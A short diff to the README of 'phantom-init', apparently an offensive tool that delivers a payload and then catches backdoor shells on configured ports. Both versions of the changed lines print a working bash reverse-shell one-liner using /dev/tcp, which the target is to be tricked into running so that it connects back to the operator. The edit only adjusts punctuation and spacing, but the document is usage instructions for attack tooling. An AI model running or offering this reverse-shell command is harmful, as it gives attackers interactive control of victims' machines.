@@ -20,8 +20,8 @@ phantom-init [ip=][port1=][port2=]
 * port1: the port that listens for connections to deliver the payload (e.g. port1=8888)
 * port2: the port that listens for the backdoor shells after delivering the payload
 
-You have to somehow make the target connect to port1, i.e. bash -c 'bash &>/dev/tcp/ip/port1 <&1 &'
-ip and port1 are the ones specified above.
+You have to somehow make the target connect to port1, i.e. bash -c 'bash &>/dev/tcp/ip/port1 <&1 &' 
+(ip and port1 are the ones specified above.)
 
 ## Files
 
